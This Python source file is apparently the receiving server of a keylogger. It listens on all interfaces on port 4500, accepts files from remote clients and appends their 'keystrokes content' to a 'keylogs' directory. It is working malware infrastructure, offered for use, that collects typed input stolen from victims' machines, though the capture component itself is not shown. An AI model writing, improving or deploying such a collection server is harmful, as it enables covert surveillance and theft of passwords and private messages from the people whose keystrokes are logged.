import socket
import threading
import os
import re

# Removes illegal characters from FILENAME not the logs
def sanitize_filename(filename):
    return re.sub(r'[^\w\-_\. ]', '', filename)

def receive_file_from_client(save_directory, client_socket):
    # Receive file info
    file_name_length = int.from_bytes(client_socket.recv(4), byteorder='big')
    file_name = client_socket.recv(file_name_length).decode()
    sanitized_name = sanitize_filename(file_name)
    
    file_path = os.path.join(save_directory, sanitized_name)

    # Receive the logs
    file_data_length = int.from_bytes(client_socket.recv(8), byteorder='big')
    file_data = client_socket.recv(file_data_length)

    # Add the received keystrokes content to the existing file or create a new file if it doesn't exist
    with open(file_path, "ab") as file:
        file.write(file_data)

    print(f"File {file_name} received and saved as {file_path}")

# Manages the whole reciving part
def start_server(save_directory, host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"Server listening on {host}:{port}")

        while True:
            conn, addr = server_socket.accept()
            # Handle each client connection in a separate thread
            client_thread = threading.Thread(target=handle_client, args=(conn, addr, save_directory))
            client_thread.start()

# Handles each client so everything doesnt get mixed up
def handle_client(conn, addr, save_directory):
    print(f"Connected by {addr}")
    try:
        receive_file_from_client(save_directory, conn)
    except Exception as e:
        print(f"Error handling client {addr}: {e}")
    finally:
        conn.close()

# Main loop
if __name__ == "__main__":
    save_directory = "keylogs"  # Change this to the directory where you want to save received files. Leave empty for the directory of the program
    host = "0.0.0.0"  # Listen on all available interfaces
    port = 4500 # Port. Can change to your liking just make SURE that the same port is set on both ends

    start_server(save_directory, host, port)
